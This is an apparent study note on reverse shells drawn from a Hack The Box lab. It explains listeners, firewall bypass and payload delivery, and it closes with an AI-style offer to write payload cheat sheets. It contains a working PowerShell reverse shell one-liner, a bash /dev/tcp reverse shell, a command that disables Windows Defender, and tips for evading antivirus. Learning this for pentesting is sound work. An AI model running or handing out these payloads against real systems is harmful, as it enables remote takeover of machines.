# 1️⃣ What Is a Reverse Shell?

With a **reverse shell**, the attack box has a listener running, and the **target initiates the connection back to the attacker**.

This means:

- Attacker = Server (listener)
    
- Target = Client (connects back)
    

This is the opposite of a bind shell.

---

## 🔹 Reverse Shell Architecture

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png)

![Image](https://cdn.prod.website-files.com/5ff66329429d880392f6cba2/676182bc78b8b88106a17157_626822d9beb1b531fd597ae2_Reverse%2520Shell%2520in%2520action.jpeg)

![Image](https://www.researchgate.net/publication/335456696/figure/fig1/AS%3A806675057504258%401569337729909/An-example-of-a-reverse-TCP-shell.jpg)

![Image](https://cdn.prod.website-files.com/5ff66329429d880392f6cba2/626822996547b3c0bfea6942_Reverse%20Shell%20Previe.jpg)

Example:

|System|IP|Role|
|---|---|---|
|Attack Box|10.10.14.15|Listener (Server)|
|Target|10.10.14.20|Connects back (Client)|
|Port|1337|Communication port|

---

# 2️⃣ Why Reverse Shells Are Preferred

Reverse shells are used more often in real-world penetration testing.

## 🔹 Reasons

|Reason|Explanation|
|---|---|
|Firewall bypass|Outbound connections are usually allowed|
|Less suspicious|Inbound connections are blocked more strictly|
|NAT bypass|Works even if target is behind NAT|
|Reliable|More likely to succeed|
|Harder to detect|Outbound traffic less monitored|

Admins typically configure firewalls to block incoming connections but allow outgoing connections like:

- HTTPS (443)
    
- HTTP (80)
    
- DNS (53)
    

---

# 3️⃣ Reverse Shell Attack Flow

|Step|Action|
|---|---|
|1|Attacker starts listener|
|2|Attacker delivers payload|
|3|Target executes payload|
|4|Target connects to attacker|
|5|Shell session established|
|6|Attacker executes commands|

---

# 4️⃣ Reverse Shell Listener (Attack Box)

We start Netcat listener on attacker machine.

```bash
sudo nc -lvnp 443
```

Output:

```bash
Listening on 0.0.0.0 443
```

---

## 🔹 Why Port 443?

|Reason|Explanation|
|---|---|
|HTTPS port|Used by web browsing|
|Allowed outbound|Rarely blocked|
|Blends with normal traffic|Harder to detect|

However, advanced firewalls with Deep Packet Inspection (DPI) may still detect malicious traffic.

---

# 5️⃣ Reverse Shell Payload (Windows PowerShell)

On Windows target:

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

# 6️⃣ PowerShell Payload Breakdown

|Component|Purpose|
|---|---|
|powershell|Starts PowerShell|
|-nop|No profile|
|TCPClient|Connect to attacker|
|GetStream()|Open communication|
|iex|Execute received commands|
|Write()|Send output back|
|Flush()|Send immediately|
|Close()|Close connection|

This code creates a fully interactive reverse shell.

---

# 7️⃣ Reverse Shell Connection Process

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png)

![Image](https://www.ionos.com/digitalguide/fileadmin/DigitalGuide/Screenshots_2020/netcat-5.png)

![Image](https://www.researchgate.net/publication/335456696/figure/fig1/AS%3A806675057504258%401569337729909/An-example-of-a-reverse-TCP-shell.jpg)

![Image](https://www.infosecinstitute.com/contentassets/9a9615a147f34eadba449fb6ac3516c0/icmp-reverseshell11042014.gif)

Flow:

|Step|System|Action|
|---|---|---|
|1|Attacker|Starts nc listener|
|2|Target|Executes PowerShell payload|
|3|Target|Connects to attacker|
|4|Attacker|Receives connection|
|5|Attacker|Gets shell|

---

# 8️⃣ Antivirus Blocking Reverse Shell

Example error:

```powershell
This script contains malicious content and has been blocked by your antivirus software.
```

This happens because Windows Defender detects malicious behavior.

---

# 9️⃣ Disabling Windows Defender (Lab Only)

Command (Run as Administrator):

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

⚠ This is for lab/testing only.

In real engagements, attackers bypass AV using:

- Obfuscation
    
- Encoding
    
- Custom payloads
    
- Living off the land techniques
    

---

# 🔟 Successful Reverse Shell Connection

Attacker listener shows:

```bash
Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674
```

Shell appears:

```powershell
PS C:\Users\htb-student>
```

Test command:

```powershell
whoami
```

Output:

```powershell
ws01\htb-student
```

This confirms successful reverse shell.

---

# 1️⃣1️⃣ Reverse Shell Verification Commands

|Command|Purpose|
|---|---|
|whoami|Current user|
|hostname|System name|
|pwd|Current directory|
|dir|List files|
|ipconfig|Network info|
|systeminfo|System details|

---

# 1️⃣2️⃣ Payload Delivery Methods

Reverse shell payloads can be delivered using:

|Method|Example|
|---|---|
|File upload|Upload malicious file|
|Command injection|Inject reverse shell|
|Exploit|Use vulnerability|
|Phishing|Malicious attachment|
|Web shell|Execute commands|
|RCE vulnerability|Remote code execution|

---

# 1️⃣3️⃣ Living Off the Land (LOLBins)

Living off the land means using built-in tools.

Example native tools:

|Tool|OS|
|---|---|
|PowerShell|Windows|
|bash|Linux|
|python|Linux|
|sh|Linux|
|cmd.exe|Windows|

This avoids uploading suspicious tools.

---

# 1️⃣4️⃣ Bind Shell vs Reverse Shell Comparison

|Feature|Bind Shell|Reverse Shell|
|---|---|---|
|Listener location|Target|Attacker|
|Connection direction|Attacker → Target|Target → Attacker|
|Firewall bypass|Difficult|Easy|
|Detection risk|High|Lower|
|Real-world usage|Less common|Very common|

---

# 1️⃣5️⃣ Reverse Shell Workflow (Pentester)

|Step|Action|
|---|---|
|1|Identify vulnerability|
|2|Create payload|
|3|Start listener|
|4|Deliver payload|
|5|Target connects back|
|6|Gain shell|
|7|Execute commands|
|8|Escalate privileges|

---

# 1️⃣6️⃣ Netcat Reverse Shell Quick Reference

|Task|Command|
|---|---|
|Start listener|nc -lvnp 443|
|PowerShell reverse shell|PowerShell TCPClient|
|Linux reverse shell|bash -i >& /dev/tcp/IP/PORT 0>&1|
|Verify shell|whoami|
|Stabilize shell|python3 -c 'import pty; pty.spawn("/bin/bash")'|

---

# 1️⃣7️⃣ Important Pentester Notes

|Important Point|Explanation|
|---|---|
|Reverse shells bypass firewalls|Outbound allowed|
|Listener runs on attacker|Target connects back|
|Port selection important|Use common ports|
|AV may block payload|Requires evasion|
|Native tools preferred|Avoid detection|

---

# 1️⃣8️⃣ Reverse Shell Concept Summary

```text
Attacker → Starts Listener
Target → Executes Payload
Target → Connects to Attacker
Attacker → Gains Shell Access
```

---

If you want, I can also create:

- Reverse Shell Cheat Sheet (table only)
    
- PowerShell reverse shell cheat sheet
    
- Linux reverse shell cheat sheet
    
- Fully categorized reverse shell payload list (HTB style)